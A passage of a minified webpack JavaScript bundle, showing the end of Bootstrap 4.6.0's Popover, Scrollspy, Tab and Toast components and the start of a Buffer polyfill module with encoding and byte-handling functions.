              MOUSELEAVE: "mouseleave" + mr
            },
            Sr = function (e) {
              function t() {
                return e.apply(this, arguments) || this;
              }
              d(t, e);
              var n = t.prototype;
              return n.isWithContent = function () {
                return this.getTitle() || this._getContent();
              }, n.addAttachmentClass = function (e) {
                i.default(this.getTipElement()).addClass(vr + "-" + e);
              }, n.getTipElement = function () {
                return this.tip = this.tip || i.default(this.config.template)[0], this.tip;
              }, n.setContent = function () {
                var e = i.default(this.getTipElement());
                this.setElementContent(e.find(xr), this.getTitle());
                var t = this._getContent();
                "function" == typeof t && (t = t.call(this.element)), this.setElementContent(e.find(Tr), t), e.removeClass(_r + " " + Er);
              }, n._getContent = function () {
                return this.element.getAttribute("data-content") || this.config.content;
              }, n._cleanTipClass = function () {
                var e = i.default(this.getTipElement()),
                  t = e.attr("class").match(yr);
                null !== t && t.length > 0 && e.removeClass(t.join(""));
              }, t._jQueryInterface = function (e) {
                return this.each(function () {
                  var n = i.default(this).data(pr),
                    r = "object" == typeof e ? e : null;
                  if ((n || !/dispose|hide/.test(e)) && (n || (n = new t(this, r), i.default(this).data(pr, n)), "string" == typeof e)) {
                    if (void 0 === n[e]) throw new TypeError('No method named "' + e + '"');
                    n[e]();
                  }
                });
              }, u(t, null, [{
                key: "VERSION",
                get: function () {
                  return hr;
                }
              }, {
                key: "Default",
                get: function () {
                  return br;
                }
              }, {
                key: "NAME",
                get: function () {
                  return fr;
                }
              }, {
                key: "DATA_KEY",
                get: function () {
                  return pr;
                }
              }, {
                key: "Event",
                get: function () {
                  return Cr;
                }
              }, {
                key: "EVENT_KEY",
                get: function () {
                  return mr;
                }
              }, {
                key: "DefaultType",
                get: function () {
                  return wr;
                }
              }]), t;
            }(cr);
          i.default.fn[fr] = Sr._jQueryInterface, i.default.fn[fr].Constructor = Sr, i.default.fn[fr].noConflict = function () {
            return i.default.fn[fr] = gr, Sr._jQueryInterface;
          };
          var Dr = "scrollspy",
            Ar = "4.6.0",
            $r = "bs.scrollspy",
            kr = "." + $r,
            Nr = ".data-api",
            Or = i.default.fn[Dr],
            jr = {
              offset: 10,
              method: "auto",
              target: ""
            },
            Rr = {
              offset: "number",
              method: "string",
              target: "(string|element)"
            },
            Pr = "activate" + kr,
            Lr = "scroll" + kr,
            Ir = "load" + kr + Nr,
            Fr = "dropdown-item",
            Br = "active",
            Mr = '[data-spy="scroll"]',
            Ur = ".nav, .list-group",
            qr = ".nav-link",
            Hr = ".nav-item",
            Wr = ".list-group-item",
            zr = ".dropdown",
            Yr = ".dropdown-item",
            Vr = ".dropdown-toggle",
            Qr = "offset",
            Xr = "position",
            Kr = function () {
              function e(e, t) {
                var n = this;
                this._element = e, this._scrollElement = "BODY" === e.tagName ? window : e, this._config = this._getConfig(t), this._selector = this._config.target + " " + qr + "," + this._config.target + " " + Wr + "," + this._config.target + " " + Yr, this._offsets = [], this._targets = [], this._activeTarget = null, this._scrollHeight = 0, i.default(this._scrollElement).on(Lr, function (e) {
                  return n._process(e);
                }), this.refresh(), this._process();
              }
              var t = e.prototype;
              return t.refresh = function () {
                var e = this,
                  t = this._scrollElement === this._scrollElement.window ? Qr : Xr,
                  n = "auto" === this._config.method ? t : this._config.method,
                  r = n === Xr ? this._getScrollTop() : 0;
                this._offsets = [], this._targets = [], this._scrollHeight = this._getScrollHeight(), [].slice.call(document.querySelectorAll(this._selector)).map(function (e) {
                  var t,
                    o = v.getSelectorFromElement(e);
                  if (o && (t = document.querySelector(o)), t) {
                    var a = t.getBoundingClientRect();
                    if (a.width || a.height) return [i.default(t)[n]().top + r, o];
                  }
                  return null;
                }).filter(function (e) {
                  return e;
                }).sort(function (e, t) {
                  return e[0] - t[0];
                }).forEach(function (t) {
                  e._offsets.push(t[0]), e._targets.push(t[1]);
                });
              }, t.dispose = function () {
                i.default.removeData(this._element, $r), i.default(this._scrollElement).off(kr), this._element = null, this._scrollElement = null, this._config = null, this._selector = null, this._offsets = null, this._targets = null, this._activeTarget = null, this._scrollHeight = null;
              }, t._getConfig = function (e) {
                if ("string" != typeof (e = s({}, jr, "object" == typeof e && e ? e : {})).target && v.isElement(e.target)) {
                  var t = i.default(e.target).attr("id");
                  t || (t = v.getUID(Dr), i.default(e.target).attr("id", t)), e.target = "#" + t;
                }
                return v.typeCheckConfig(Dr, e, Rr), e;
              }, t._getScrollTop = function () {
                return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
              }, t._getScrollHeight = function () {
                return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
              }, t._getOffsetHeight = function () {
                return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
              }, t._process = function () {
                var e = this._getScrollTop() + this._config.offset,
                  t = this._getScrollHeight(),
                  n = this._config.offset + t - this._getOffsetHeight();
                if (this._scrollHeight !== t && this.refresh(), e >= n) {
                  var r = this._targets[this._targets.length - 1];
                  this._activeTarget !== r && this._activate(r);
                } else {
                  if (this._activeTarget && e < this._offsets[0] && this._offsets[0] > 0) return this._activeTarget = null, void this._clear();
                  for (var i = this._offsets.length; i--;) this._activeTarget !== this._targets[i] && e >= this._offsets[i] && (void 0 === this._offsets[i + 1] || e < this._offsets[i + 1]) && this._activate(this._targets[i]);
                }
              }, t._activate = function (e) {
                this._activeTarget = e, this._clear();
                var t = this._selector.split(",").map(function (t) {
                    return t + '[data-target="' + e + '"],' + t + '[href="' + e + '"]';
                  }),
                  n = i.default([].slice.call(document.querySelectorAll(t.join(","))));
                n.hasClass(Fr) ? (n.closest(zr).find(Vr).addClass(Br), n.addClass(Br)) : (n.addClass(Br), n.parents(Ur).prev(qr + ", " + Wr).addClass(Br), n.parents(Ur).prev(Hr).children(qr).addClass(Br)), i.default(this._scrollElement).trigger(Pr, {
                  relatedTarget: e
                });
              }, t._clear = function () {
                [].slice.call(document.querySelectorAll(this._selector)).filter(function (e) {
                  return e.classList.contains(Br);
                }).forEach(function (e) {
                  return e.classList.remove(Br);
                });
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this).data($r);
                  if (n || (n = new e(this, "object" == typeof t && t), i.default(this).data($r, n)), "string" == typeof t) {
                    if (void 0 === n[t]) throw new TypeError('No method named "' + t + '"');
                    n[t]();
                  }
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return Ar;
                }
              }, {
                key: "Default",
                get: function () {
                  return jr;
                }
              }]), e;
            }();
          i.default(window).on(Ir, function () {
            for (var e = [].slice.call(document.querySelectorAll(Mr)), t = e.length; t--;) {
              var n = i.default(e[t]);
              Kr._jQueryInterface.call(n, n.data());
            }
          }), i.default.fn[Dr] = Kr._jQueryInterface, i.default.fn[Dr].Constructor = Kr, i.default.fn[Dr].noConflict = function () {
            return i.default.fn[Dr] = Or, Kr._jQueryInterface;
          };
          var Jr = "tab",
            Gr = "4.6.0",
            Zr = "bs.tab",
            ei = "." + Zr,
            ti = ".data-api",
            ni = i.default.fn[Jr],
            ri = "hide" + ei,
            ii = "hidden" + ei,
            oi = "show" + ei,
            ai = "shown" + ei,
            ui = "click" + ei + ti,
            si = "dropdown-menu",
            di = "active",
            li = "disabled",
            ci = "fade",
            fi = "show",
            hi = ".dropdown",
            pi = ".nav, .list-group",
            mi = ".active",
            gi = "> li > .active",
            vi = '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
            yi = ".dropdown-toggle",
            bi = "> .dropdown-menu .active",
            wi = function () {
              function e(e) {
                this._element = e;
              }
              var t = e.prototype;
              return t.show = function () {
                var e = this;
                if (!(this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && i.default(this._element).hasClass(di) || i.default(this._element).hasClass(li))) {
                  var t,
                    n,
                    r = i.default(this._element).closest(pi)[0],
                    o = v.getSelectorFromElement(this._element);
                  if (r) {
                    var a = "UL" === r.nodeName || "OL" === r.nodeName ? gi : mi;
                    n = (n = i.default.makeArray(i.default(r).find(a)))[n.length - 1];
                  }
                  var u = i.default.Event(ri, {
                      relatedTarget: this._element
                    }),
                    s = i.default.Event(oi, {
                      relatedTarget: n
                    });
                  if (n && i.default(n).trigger(u), i.default(this._element).trigger(s), !s.isDefaultPrevented() && !u.isDefaultPrevented()) {
                    o && (t = document.querySelector(o)), this._activate(this._element, r);
                    var d = function () {
                      var t = i.default.Event(ii, {
                          relatedTarget: e._element
                        }),
                        r = i.default.Event(ai, {
                          relatedTarget: n
                        });
                      i.default(n).trigger(t), i.default(e._element).trigger(r);
                    };
                    t ? this._activate(t, t.parentNode, d) : d();
                  }
                }
              }, t.dispose = function () {
                i.default.removeData(this._element, Zr), this._element = null;
              }, t._activate = function (e, t, n) {
                var r = this,
                  o = (!t || "UL" !== t.nodeName && "OL" !== t.nodeName ? i.default(t).children(mi) : i.default(t).find(gi))[0],
                  a = n && o && i.default(o).hasClass(ci),
                  u = function () {
                    return r._transitionComplete(e, o, n);
                  };
                if (o && a) {
                  var s = v.getTransitionDurationFromElement(o);
                  i.default(o).removeClass(fi).one(v.TRANSITION_END, u).emulateTransitionEnd(s);
                } else u();
              }, t._transitionComplete = function (e, t, n) {
                if (t) {
                  i.default(t).removeClass(di);
                  var r = i.default(t.parentNode).find(bi)[0];
                  r && i.default(r).removeClass(di), "tab" === t.getAttribute("role") && t.setAttribute("aria-selected", !1);
                }
                if (i.default(e).addClass(di), "tab" === e.getAttribute("role") && e.setAttribute("aria-selected", !0), v.reflow(e), e.classList.contains(ci) && e.classList.add(fi), e.parentNode && i.default(e.parentNode).hasClass(si)) {
                  var o = i.default(e).closest(hi)[0];
                  if (o) {
                    var a = [].slice.call(o.querySelectorAll(yi));
                    i.default(a).addClass(di);
                  }
                  e.setAttribute("aria-expanded", !0);
                }
                n && n();
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this),
                    r = n.data(Zr);
                  if (r || (r = new e(this), n.data(Zr, r)), "string" == typeof t) {
                    if (void 0 === r[t]) throw new TypeError('No method named "' + t + '"');
                    r[t]();
                  }
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return Gr;
                }
              }]), e;
            }();
          i.default(document).on(ui, vi, function (e) {
            e.preventDefault(), wi._jQueryInterface.call(i.default(this), "show");
          }), i.default.fn[Jr] = wi._jQueryInterface, i.default.fn[Jr].Constructor = wi, i.default.fn[Jr].noConflict = function () {
            return i.default.fn[Jr] = ni, wi._jQueryInterface;
          };
          var _i = "toast",
            Ei = "4.6.0",
            xi = "bs.toast",
            Ti = "." + xi,
            Ci = i.default.fn[_i],
            Si = "click.dismiss" + Ti,
            Di = "hide" + Ti,
            Ai = "hidden" + Ti,
            $i = "show" + Ti,
            ki = "shown" + Ti,
            Ni = "fade",
            Oi = "hide",
            ji = "show",
            Ri = "showing",
            Pi = {
              animation: "boolean",
              autohide: "boolean",
              delay: "number"
            },
            Li = {
              animation: !0,
              autohide: !0,
              delay: 500
            },
            Ii = '[data-dismiss="toast"]',
            Fi = function () {
              function e(e, t) {
                this._element = e, this._config = this._getConfig(t), this._timeout = null, this._setListeners();
              }
              var t = e.prototype;
              return t.show = function () {
                var e = this,
                  t = i.default.Event($i);
                if (i.default(this._element).trigger(t), !t.isDefaultPrevented()) {
                  this._clearTimeout(), this._config.animation && this._element.classList.add(Ni);
                  var n = function () {
                    e._element.classList.remove(Ri), e._element.classList.add(ji), i.default(e._element).trigger(ki), e._config.autohide && (e._timeout = setTimeout(function () {
                      e.hide();
                    }, e._config.delay));
                  };
                  if (this._element.classList.remove(Oi), v.reflow(this._element), this._element.classList.add(Ri), this._config.animation) {
                    var r = v.getTransitionDurationFromElement(this._element);
                    i.default(this._element).one(v.TRANSITION_END, n).emulateTransitionEnd(r);
                  } else n();
                }
              }, t.hide = function () {
                if (this._element.classList.contains(ji)) {
                  var e = i.default.Event(Di);
                  i.default(this._element).trigger(e), e.isDefaultPrevented() || this._close();
                }
              }, t.dispose = function () {
                this._clearTimeout(), this._element.classList.contains(ji) && this._element.classList.remove(ji), i.default(this._element).off(Si), i.default.removeData(this._element, xi), this._element = null, this._config = null;
              }, t._getConfig = function (e) {
                return e = s({}, Li, i.default(this._element).data(), "object" == typeof e && e ? e : {}), v.typeCheckConfig(_i, e, this.constructor.DefaultType), e;
              }, t._setListeners = function () {
                var e = this;
                i.default(this._element).on(Si, Ii, function () {
                  return e.hide();
                });
              }, t._close = function () {
                var e = this,
                  t = function () {
                    e._element.classList.add(Oi), i.default(e._element).trigger(Ai);
                  };
                if (this._element.classList.remove(ji), this._config.animation) {
                  var n = v.getTransitionDurationFromElement(this._element);
                  i.default(this._element).one(v.TRANSITION_END, t).emulateTransitionEnd(n);
                } else t();
              }, t._clearTimeout = function () {
                clearTimeout(this._timeout), this._timeout = null;
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this),
                    r = n.data(xi);
                  if (r || (r = new e(this, "object" == typeof t && t), n.data(xi, r)), "string" == typeof t) {
                    if (void 0 === r[t]) throw new TypeError('No method named "' + t + '"');
                    r[t](this);
                  }
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return Ei;
                }
              }, {
                key: "DefaultType",
                get: function () {
                  return Pi;
                }
              }, {
                key: "Default",
                get: function () {
                  return Li;
                }
              }]), e;
            }();
          i.default.fn[_i] = Fi._jQueryInterface, i.default.fn[_i].Constructor = Fi, i.default.fn[_i].noConflict = function () {
            return i.default.fn[_i] = Ci, Fi._jQueryInterface;
          }, e.Alert = N, e.Button = J, e.Carousel = We, e.Collapse = ft, e.Dropdown = en, e.Modal = Ln, e.Popover = Sr, e.Scrollspy = Kr, e.Tab = wi, e.Toast = Fi, e.Tooltip = cr, e.Util = v, Object.defineProperty(e, "__esModule", {
            value: !0
          });
        }(t, n(9755), n(8981));
      },
      8764: (e, t, n) => {
        "use strict";

        var r = n(9742),
          i = n(645),
          o = n(7300);
        function a() {
          return s.TYPED_ARRAY_SUPPORT ? 2147483647 : 1073741823;
        }
        function u(e, t) {
          if (a() < t) throw new RangeError("Invalid typed array length");
          return s.TYPED_ARRAY_SUPPORT ? (e = new Uint8Array(t)).__proto__ = s.prototype : (null === e && (e = new s(t)), e.length = t), e;
        }
        function s(e, t, n) {
          if (!(s.TYPED_ARRAY_SUPPORT || this instanceof s)) return new s(e, t, n);
          if ("number" == typeof e) {
            if ("string" == typeof t) throw new Error("If encoding is specified then the first argument must be a string");
            return c(this, e);
          }
          return d(this, e, t, n);
        }
        function d(e, t, n, r) {
          if ("number" == typeof t) throw new TypeError('"value" argument must not be a number');
          return "undefined" != typeof ArrayBuffer && t instanceof ArrayBuffer ? function (e, t, n, r) {
            if (t.byteLength, n < 0 || t.byteLength < n) throw new RangeError("'offset' is out of bounds");
            if (t.byteLength < n + (r || 0)) throw new RangeError("'length' is out of bounds");
            t = void 0 === n && void 0 === r ? new Uint8Array(t) : void 0 === r ? new Uint8Array(t, n) : new Uint8Array(t, n, r);
            s.TYPED_ARRAY_SUPPORT ? (e = t).__proto__ = s.prototype : e = f(e, t);
            return e;
          }(e, t, n, r) : "string" == typeof t ? function (e, t, n) {
            "string" == typeof n && "" !== n || (n = "utf8");
            if (!s.isEncoding(n)) throw new TypeError('"encoding" must be a valid string encoding');
            var r = 0 | p(t, n);
            e = u(e, r);
            var i = e.write(t, n);
            i !== r && (e = e.slice(0, i));
            return e;
          }(e, t, n) : function (e, t) {
            if (s.isBuffer(t)) {
              var n = 0 | h(t.length);
              return 0 === (e = u(e, n)).length || t.copy(e, 0, 0, n), e;
            }
            if (t) {
              if ("undefined" != typeof ArrayBuffer && t.buffer instanceof ArrayBuffer || "length" in t) return "number" != typeof t.length || (r = t.length) != r ? u(e, 0) : f(e, t);
              if ("Buffer" === t.type && o(t.data)) return f(e, t.data);
            }
            var r;
            throw new TypeError("First argument must be a string, Buffer, ArrayBuffer, Array, or array-like object.");
          }(e, t);
        }
        function l(e) {
          if ("number" != typeof e) throw new TypeError('"size" argument must be a number');
          if (e < 0) throw new RangeError('"size" argument must not be negative');
        }
        function c(e, t) {
          if (l(t), e = u(e, t < 0 ? 0 : 0 | h(t)), !s.TYPED_ARRAY_SUPPORT) for (var n = 0; n < t; ++n) e[n] = 0;
          return e;
        }
        function f(e, t) {
          var n = t.length < 0 ? 0 : 0 | h(t.length);
          e = u(e, n);
          for (var r = 0; r < n; r += 1) e[r] = 255 & t[r];
          return e;
        }
        function h(e) {
          if (e >= a()) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + a().toString(16) + " bytes");
          return 0 | e;
        }
        function p(e, t) {
          if (s.isBuffer(e)) return e.length;
          if ("undefined" != typeof ArrayBuffer && "function" == typeof ArrayBuffer.isView && (ArrayBuffer.isView(e) || e instanceof ArrayBuffer)) return e.byteLength;
          "string" != typeof e && (e = "" + e);
          var n = e.length;
          if (0 === n) return 0;
          for (var r = !1;;) switch (t) {
            case "ascii":
            case "latin1":
            case "binary":
              return n;
            case "utf8":
            case "utf-8":
            case void 0:
              return U(e).length;
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return 2 * n;
            case "hex":
              return n >>> 1;
            case "base64":
              return q(e).length;
            default:
              if (r) return U(e).length;
              t = ("" + t).toLowerCase(), r = !0;
          }
        }
        function m(e, t, n) {
          var r = !1;
          if ((void 0 === t || t < 0) && (t = 0), t > this.length) return "";
          if ((void 0 === n || n > this.length) && (n = this.length), n <= 0) return "";
          if ((n >>>= 0) <= (t >>>= 0)) return "";
          for (e || (e = "utf8");;) switch (e) {
            case "hex":
              return k(this, t, n);
            case "utf8":
            case "utf-8":
              return S(this, t, n);
            case "ascii":
              return A(this, t, n);
            case "latin1":
            case "binary":
              return $(this, t, n);
            case "base64":
              return C(this, t, n);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return N(this, t, n);
            default:
              if (r) throw new TypeError("Unknown encoding: " + e);
              e = (e + "").toLowerCase(), r = !0;
          }
        }
        function g(e, t, n) {
          var r = e[t];
          e[t] = e[n], e[n] = r;
        }
        function v(e, t, n, r, i) {
          if (0 === e.length) return -1;
          if ("string" == typeof n ? (r = n, n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648), n = +n, isNaN(n) && (n = i ? 0 : e.length - 1), n < 0 && (n = e.length + n), n >= e.length) {
            if (i) return -1;
            n = e.length - 1;
          } else if (n < 0) {
            if (!i) return -1;
            n = 0;
          }
          if ("string" == typeof t && (t = s.from(t, r)), s.isBuffer(t)) return 0 === t.length ? -1 : y(e, t, n, r, i);
          if ("number" == typeof t) return t &= 255, s.TYPED_ARRAY_SUPPORT && "function" == typeof Uint8Array.prototype.indexOf ? i ? Uint8Array.prototype.indexOf.call(e, t, n) : Uint8Array.prototype.lastIndexOf.call(e, t, n) : y(e, [t], n, r, i);
          throw new TypeError("val must be string, number or Buffer");
        }
        function y(e, t, n, r, i) {
          var o,
            a = 1,
            u = e.length,
            s = t.length;
          if (void 0 !== r && ("ucs2" === (r = String(r).toLowerCase()) || "ucs-2" === r || "utf16le" === r || "utf-16le" === r)) {
            if (e.length < 2 || t.length < 2) return -1;
            a = 2, u /= 2, s /= 2, n /= 2;
          }
          function d(e, t) {
            return 1 === a ? e[t] : e.readUInt16BE(t * a);
          }
          if (i) {
            var l = -1;
            for (o = n; o < u; o++) if (d(e, o) === d(t, -1 === l ? 0 : o - l)) {
              if (-1 === l && (l = o), o - l + 1 === s) return l * a;
            } else -1 !== l && (o -= o - l), l = -1;
          } else for (n + s > u && (n = u - s), o = n; o >= 0; o--) {
            for (var c = !0, f = 0; f < s; f++) if (d(e, o + f) !== d(t, f)) {
              c = !1;
              break;
            }
            if (c) return o;
          }
          return -1;
        }
        function b(e, t, n, r) {
          n = Number(n) || 0;
          var i = e.length - n;
          r ? (r = Number(r)) > i && (r = i) : r = i;
          var o = t.length;
          if (o % 2 != 0) throw new TypeError("Invalid hex string");
          r > o / 2 && (r = o / 2);
          for (var a = 0; a < r; ++a) {
            var u = parseInt(t.substr(2 * a, 2), 16);
            if (isNaN(u)) return a;
            e[n + a] = u;
          }
          return a;
        }
        function w(e, t, n, r) {
          return H(U(t, e.length - n), e, n, r);
        }
        function _(e, t, n, r) {
          return H(function (e) {
            for (var t = [], n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
            return t;
          }(t), e, n, r);
        }
        function E(e, t, n, r) {
          return _(e, t, n, r);
        }
        function x(e, t, n, r) {
          return H(q(t), e, n, r);
        }
        function T(e, t, n, r) {
          return H(function (e, t) {
            for (var n, r, i, o = [], a = 0; a < e.length && !((t -= 2) < 0); ++a) r = (n = e.charCodeAt(a)) >> 8, i = n % 256, o.push(i), o.push(r);
            return o;
          }(t, e.length - n), e, n, r);
        }
        function C(e, t, n) {
          return 0 === t && n === e.length ? r.fromByteArray(e) : r.fromByteArray(e.slice(t, n));
        }
        function S(e, t, n) {
          n = Math.min(e.length, n);
          for (var r = [], i = t; i < n;) {
            var o,
              a,
              u,
              s,
              d = e[i],
              l = null,
              c = d > 239 ? 4 : d > 223 ? 3 : d > 191 ? 2 : 1;
            if (i + c <= n) switch (c) {
              case 1:
                d < 128 && (l = d);
                break;
              case 2:
                128 == (192 & (o = e[i + 1])) && (s = (31 & d) << 6 | 63 & o) > 127 && (l = s);
                break;
              case 3:
                o = e[i + 1], a = e[i + 2], 128 == (192 & o) && 128 == (192 & a) && (s = (15 & d) << 12 | (63 & o) << 6 | 63 & a) > 2047 && (s < 55296 || s > 57343) && (l = s);
                break;
              case 4:
                o = e[i + 1], a = e[i + 2], u = e[i + 3], 128 == (192 & o) && 128 == (192 & a) && 128 == (192 & u) && (s = (15 & d) << 18 | (63 & o) << 12 | (63 & a) << 6 | 63 & u) > 65535 && s < 1114112 && (l = s);
            }
            null === l ? (l = 65533, c = 1) : l > 65535 && (l -= 65536, r.push(l >>> 10 & 1023 | 55296), l = 56320 | 1023 & l), r.push(l), i += c;
          }
          return function (e) {
            var t = e.length;
            if (t <= D) return String.fromCharCode.apply(String, e);
            var n = "",
              r = 0;
            for (; r < t;) n += String.fromCharCode.apply(String, e.slice(r, r += D));
            return n;
          }(r);
        }
        t.lW = s, t.h2 = 50, s.TYPED_ARRAY_SUPPORT = void 0 !== n.g.TYPED_ARRAY_SUPPORT ? n.g.TYPED_ARRAY_SUPPORT : function () {
          try {
            var e = new Uint8Array(1);
            return e.__proto__ = {
              __proto__: Uint8Array.prototype,
              foo: function () {
                return 42;
              }
            }, 42 === e.foo() && "function" == typeof e.subarray && 0 === e.subarray(1, 1).byteLength;
          } catch (e) {
            return !1;
          }
        }(), a(), s.poolSize = 8192, s._augment = function (e) {
          return e.__proto__ = s.prototype, e;
        }, s.from = function (e, t, n) {
          return d(null, e, t, n);
        }, s.TYPED_ARRAY_SUPPORT && (s.prototype.__proto__ = Uint8Array.prototype, s.__proto__ = Uint8Array, "undefined" != typeof Symbol && Symbol.species && s[Symbol.species] === s && Object.defineProperty(s, Symbol.species, {
          value: null,
          configurable: !0
        })), s.alloc = function (e, t, n) {
          return function (e, t, n, r) {
            return l(t), t <= 0 ? u(e, t) : void 0 !== n ? "string" == typeof r ? u(e, t).fill(n, r) : u(e, t).fill(n) : u(e, t);
          }(null, e, t, n);
        }, s.allocUnsafe = function (e) {
          return c(null, e);
        }, s.allocUnsafeSlow = function (e) {
          return c(null, e);
        }, s.isBuffer = function (e) {
          return !(null == e || !e._isBuffer);
        }, s.compare = function (e, t) {
          if (!s.isBuffer(e) || !s.isBuffer(t)) throw new TypeError("Arguments must be Buffers");
          if (e === t) return 0;
          for (var n = e.length, r = t.length, i = 0, o = Math.min(n, r); i < o; ++i) if (e[i] !== t[i]) {
            n = e[i], r = t[i];
            break;
          }
          return n < r ? -1 : r < n ? 1 : 0;
        }, s.isEncoding = function (e) {
          switch (String(e).toLowerCase()) {
            case "hex":
            case "utf8":
            case "utf-8":
            case "ascii":
            case "latin1":
            case "binary":
            case "base64":
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return !0;
            default:
              return !1;
          }
        }, s.concat = function (e, t) {
          if (!o(e)) throw new TypeError('"list" argument must be an Array of Buffers');
          if (0 === e.length) return s.alloc(0);
          var n;
          if (void 0 === t) for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
          var r = s.allocUnsafe(t),
            i = 0;
          for (n = 0; n < e.length; ++n) {
            var a = e[n];
            if (!s.isBuffer(a)) throw new TypeError('"list" argument must be an Array of Buffers');
            a.copy(r, i), i += a.length;
          }
          return r;
        }, s.byteLength = p, s.prototype._isBuffer = !0, s.prototype.swap16 = function () {
          var e = this.length;
          if (e % 2 != 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
          for (var t = 0; t < e; t += 2) g(this, t, t + 1);
          return this;
        }, s.prototype.swap32 = function () {
          var e = this.length;
          if (e % 4 != 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
          for (var t = 0; t < e; t += 4) g(this, t, t + 3), g(this, t + 1, t + 2);
          return this;
        }, s.prototype.swap64 = function () {
          var e = this.length;
          if (e % 8 != 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
          for (var t = 0; t < e; t += 8) g(this, t, t + 7), g(this, t + 1, t + 6), g(this, t + 2, t + 5), g(this, t + 3, t + 4);
          return this;
        }, s.prototype.toString = function () {
          var e = 0 | this.length;
          return 0 === e ? "" : 0 === arguments.length ? S(this, 0, e) : m.apply(this, arguments);
        }, s.prototype.equals = function (e) {
          if (!s.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
          return this === e || 0 === s.compare(this, e);
        }, s.prototype.inspect = function () {
          var e = "",
            n = t.h2;
          return this.length > 0 && (e = this.toString("hex", 0, n).match(/.{2}/g).join(" "), this.length > n && (e += " ... ")), "<Buffer " + e + ">";
        }, s.prototype.compare = function (e, t, n, r, i) {
          if (!s.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
          if (void 0 === t && (t = 0), void 0 === n && (n = e ? e.length : 0), void 0 === r && (r = 0), void 0 === i && (i = this.length), t < 0 || n > e.length || r < 0 || i > this.length) throw new RangeError("out of range index");
          if (r >= i && t >= n) return 0;
          if (r >= i) return -1;
          if (t >= n) return 1;
          if (this === e) return 0;
          for (var o = (i >>>= 0) - (r >>>= 0), a = (n >>>= 0) - (t >>>= 0), u = Math.min(o, a), d = this.slice(r, i), l = e.slice(t, n), c = 0; c < u; ++c) if (d[c] !== l[c]) {
            o = d[c], a = l[c];
            break;
          }
          return o < a ? -1 : a < o ? 1 : 0;
        }, s.prototype.includes = function (e, t, n) {
          return -1 !== this.indexOf(e, t, n);
        }, s.prototype.indexOf = function (e, t, n) {
          return v(this, e, t, n, !0);
        }, s.prototype.lastIndexOf = function (e, t, n) {
          return v(this, e, t, n, !1);
        }, s.prototype.write = function (e, t, n, r) {
          if (void 0 === t) r = "utf8", n = this.length, t = 0;else if (void 0 === n && "string" == typeof t) r = t, n = this.length, t = 0;else {
            if (!isFinite(t)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
            t |= 0, isFinite(n) ? (n |= 0, void 0 === r && (r = "utf8")) : (r = n, n = void 0);
          }
          var i = this.length - t;
          if ((void 0 === n || n > i) && (n = i), e.length > 0 && (n < 0 || t < 0) || t > this.length) throw new RangeError("Attempt to write outside buffer bounds");
          r || (r = "utf8");
          for (var o = !1;;) switch (r) {
            case "hex":
              return b(this, e, t, n);
            case "utf8":
            case "utf-8":
              return w(this, e, t, n);
            case "ascii":
              return _(this, e, t, n);
            case "latin1":
            case "binary":
              return E(this, e, t, n);
            case "base64":
              return x(this, e, t, n);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return T(this, e, t, n);
            default:
              if (o) throw new TypeError("Unknown encoding: " + r);
              r = ("" + r).toLowerCase(), o = !0;
          }
        }, s.prototype.toJSON = function () {
          return {
            type: "Buffer",
            data: Array.prototype.slice.call(this._arr || this, 0)
          };
        };
        var D = 4096;
        function A(e, t, n) {
          var r = "";
          n = Math.min(e.length, n);
          for (var i = t; i < n; ++i) r += String.fromCharCode(127 & e[i]);
          return r;
        }
        function $(e, t, n) {
          var r = "";
          n = Math.min(e.length, n);
          for (var i = t; i < n; ++i) r += String.fromCharCode(e[i]);
          return r;
        }
        function k(e, t, n) {
          var r = e.length;
          (!t || t < 0) && (t = 0), (!n || n < 0 || n > r) && (n = r);
          for (var i = "", o = t; o < n; ++o) i += M(e[o]);
          return i;
        }
        function N(e, t, n) {
          for (var r = e.slice(t, n), i = "", o = 0; o < r.length; o += 2) i += String.fromCharCode(r[o] + 256 * r[o + 1]);
          return i;
        }
        function O(e, t, n) {
          if (e % 1 != 0 || e < 0) throw new RangeError("offset is not uint");
          if (e + t > n) throw new RangeError("Trying to access beyond buffer length");
        }
        function j(e, t, n, r, i, o) {
          if (!s.isBuffer(e)) throw new TypeError('"buffer" argument must be a Buffer instance');
          if (t > i || t < o) throw new RangeError('"value" argument is out of bounds');
          if (n + r > e.length) throw new RangeError("Index out of range");
        }
        function R(e, t, n, r) {
          t < 0 && (t = 65535 + t + 1);
          for (var i = 0, o = Math.min(e.length - n, 2); i < o; ++i) e[n + i] = (t & 255 << 8 * (r ? i : 1 - i)) >>> 8 * (r ? i : 1 - i);
        }
        function P(e, t, n, r) {
          t < 0 && (t = 4294967295 + t + 1);
          for (var i = 0, o = Math.min(e.length - n, 4); i < o; ++i) e[n + i] = t >>> 8 * (r ? i : 3 - i) & 255;
        }
        function L(e, t, n, r, i, o) {
          if (n + r > e.length) throw new RangeError("Index out of range");
          if (n < 0) throw new RangeError("Index out of range");
        }
        function I(e, t, n, r, o) {
          return o || L(e, 0, n, 4), i.write(e, t, n, r, 23, 4), n + 4;
        }
